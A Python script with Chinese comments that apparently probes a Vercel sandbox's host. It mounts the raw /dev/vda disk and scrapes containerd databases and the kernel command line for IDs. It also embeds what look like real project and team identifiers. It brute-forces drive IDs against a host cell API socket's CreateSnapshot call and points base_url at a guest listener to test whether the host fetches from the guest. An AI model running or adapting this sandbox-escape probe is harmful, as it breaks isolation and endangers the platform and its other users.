# -*- coding: utf-8 -*-
"""vda44_driveid_enum: 用真实 containerd UUID/快照 key 枚举 CreateSnapshot drive_id
昨天 vda6 只测了伪造 ID -> 全部 'drive not found'
今天: 从 meta.db/runc 目录提取本沙箱真实 UUID, 组合全部变体调 CreateSnapshot
验证逻辑:
  - 响应 != 'drive not found' 即命中 (错误会变成 base_url 解析/上传阶段错误)
  - guest 内监听端口, 同时观测 base_url 指向 127.0.0.1 时 fetch 是否发生在 guest
输出落盘 + 哨兵 V44D_DONE"""
import os, time, socket, ctypes, re, threading, json

OUT = '/vercel/sandbox/v44d.out'
os.makedirs('/vercel/sandbox', exist_ok=True)
f = open(OUT, 'w', encoding='utf-8', errors='replace')


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def rpc_unix(sockpath, path, body='{}', t=5):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/json\r\n'
               'Content-Length: %d\r\nConnection: close\r\n\r\n%s' % (path, len(body), body))
        s.sendall(req.encode())
        data = b''
        while True:
            try:
                chunk = s.recv(8192)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', ''
        head, _, rest = data.partition(b'\r\n\r\n')
        return head.split(b'\r\n')[0].decode(errors='replace'), rest[:400].decode(errors='replace')
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, ''


LISTEN_RESULT = []
LISTEN_DONE = threading.Event()


def listener(port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(('0.0.0.0', port))
        s.listen(16)
        s.settimeout(25)
        t_end = time.time() + 25
        while time.time() < t_end:
            try:
                c, addr = s.accept()
                c.settimeout(3)
                try:
                    data = c.recv(4096)
                    LISTEN_RESULT.append((addr, data[:200]))
                except Exception:
                    LISTEN_RESULT.append((addr, b''))
                c.close()
            except socket.timeout:
                continue
        s.close()
    except Exception as e:
        LISTEN_RESULT.append(('ERR', str(e).encode()))
    LISTEN_DONE.set()


def main():
    MOUNTED = False
    try:
        for ln in open('/proc/self/mountinfo', errors='replace'):
            if '/mnt/vdax' in ln:
                MOUNTED = True
                break
    except Exception:
        pass
    if not MOUNTED:
        os.makedirs('/mnt/vdax', exist_ok=True)
        ret = ctypes.CDLL(None).mount(b'/dev/vda', b'/mnt/vdax', b'xfs', 0, b'')
        log('mount ret=%d' % ret)

    sp = '/mnt/vdax/run/cell/cell.sock'
    if not os.path.exists(sp):
        log('cell.sock MISSING -> abort')
        f.close()
        return
    PATH = '/vercel.hive.cell.api.drives.v1.DrivesService/CreateSnapshot'

    # P1: 提取真实 ID
    log('=== P1 extract real IDs ===')
    uuids = []
    # meta.db / metadata.db 里的 uuid-snapshot key
    for db in ['/mnt/vdax/var/lib/containerd/io.containerd.metadata.v1.bolt/meta.db',
               '/mnt/vdax/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/metadata.db']:
        try:
            data = open(db, 'rb').read()
            for m in re.finditer(rb'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', data):
                u = m.group().decode()
                if u not in uuids:
                    uuids.append(u)
                    log('uuid: %s' % u)
        except Exception as e:
            log('db ERR %s' % e)
    # runc task 目录名也是 UUID
    try:
        base = '/mnt/vdax/run/containerd/io.containerd.runtime.v2.task/default'
        for d in os.listdir(base):
            if d not in uuids:
                uuids.append(d)
                log('task uuid: %s' % d)
    except Exception as e:
        log('task ERR %s' % e)
    # ctr_ 容器 ID (cell API 返回的)
    ctrs = []
    for db in ['/mnt/vdax/var/lib/containerd/io.containerd.metadata.v1.bolt/meta.db']:
        try:
            data = open(db, 'rb').read()
            for m in re.finditer(rb'ctr_[0-9a-f]{12,}', data):
                c = m.group().decode()
                if c not in ctrs:
                    ctrs.append(c)
                    log('ctr: %s' % c)
        except Exception:
            pass
    # hive / host 相关
    ids = []
    try:
        data = open('/mnt/vdax/var/lib/containerd/io.containerd.metadata.v1.bolt/meta.db', 'rb').read()
        for m in re.finditer(rb'hvi_[A-Za-z0-9_]+', data):
            ids.append(m.group().decode())
        for m in re.finditer(rb'i-[0-9a-f]{8,17}', data):
            ids.append(m.group().decode())
        for m in re.finditer(rb'sbx_[A-Za-z0-9]{20,}', data):
            ids.append(m.group().decode())
        log('hive/host/sbx ids: %s' % ids)
    except Exception as e:
        log('ids ERR %s' % e)
    # cmdline cell_id
    cell_id = ''
    try:
        cl = open('/proc/cmdline').read()
        m = re.search(r'cell_id=(\S+)', cl)
        if m:
            cell_id = m.group(1)
            log('cell_id: %s' % cell_id)
    except Exception:
        pass

    # P2: drive_id 变体全表
    log('=== P2 drive_id variants ===')
    variants = []
    for u in uuids:
        variants += [u, 'default/11/%s-snapshot' % u, 'overlayfs:-%s-snapshot' % u,
                     '%s-snapshot' % u, 'default/%s-snapshot' % u]
    for c in ctrs:
        variants += [c]
    variants += ids
    variants += [cell_id,
                 'rootfs', 'sandbox', 'root', 'vda', 'system', 'main', 'data',
                 'sandbox-controller', 'sandbox-controller@sha256:95fd06013f4e1708be914dc973663ab50e48d0045087340cc71cf903e2841b59',
                 'snapshot', 'drive', 'drive-0', 'cell-drive', 'boot',
                 'prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F', 'team_GIy1SZ444lspqeNbh4r8uAUg']
    seen = set()
    HIT_DID = ''
    for did in variants:
        if not did or did in seen:
            continue
        seen.add(did)
        body = '{"drive_id":"%s","base_url":"s3://127.0.0.1:1/b/k"}' % did
        t0 = time.time()
        st, bd = rpc_unix(sp, PATH, body, t=4)
        dt = time.time() - t0
        log('did %-70s -> %s (%.2fs) | %s' % (did[:70], st, dt, bd[:160].replace('\n', ' ')))
        time.sleep(0.2)
        if 'drive not found' not in bd and st.startswith('HTTP'):
            HIT_DID = did
            log('*** HIT candidate: drive_id=%s -> %s' % (did, bd[:300]))
            try:
                open('/vercel/sandbox/hit_drive_id.txt', 'w').write(did)
            except Exception:
                pass
            break

    # P3: guest 监听观测 (127.0.0.1 fetch 是否发生在 guest)
    log('=== P3 listener probe ===')
    PORT = 18080
    th = threading.Thread(target=listener, args=(PORT,))
    th.daemon = True
    th.start()
    time.sleep(1)
    # 优先用命中的候选, 否则用最后一个长变体
    probe_did = HIT_DID
    if not probe_did:
        for did in reversed(list(seen)):
            if len(did) > 10:
                probe_did = did
                break
    log('probe drive_id=%s' % probe_did)
    for url in ['s3://127.0.0.1:%d/b/k' % PORT, 's3://localhost:%d/b/k' % PORT,
                's3://127.0.0.1:1/b/k']:
        body = '{"drive_id":"%s","base_url":"%s"}' % (probe_did, url)
        t0 = time.time()
        st, bd = rpc_unix(sp, PATH, body, t=6)
        log('listener %-40s -> %s (%.2fs) | %s' % (url, st, time.time() - t0, bd[:160].replace('\n', ' ')))
        time.sleep(1)
    LISTEN_DONE.wait(28)
    log('listener hits: %s' % LISTEN_RESULT)

    log('V44D_DONE')
    f.close()


if __name__ == '__main__':
    main()
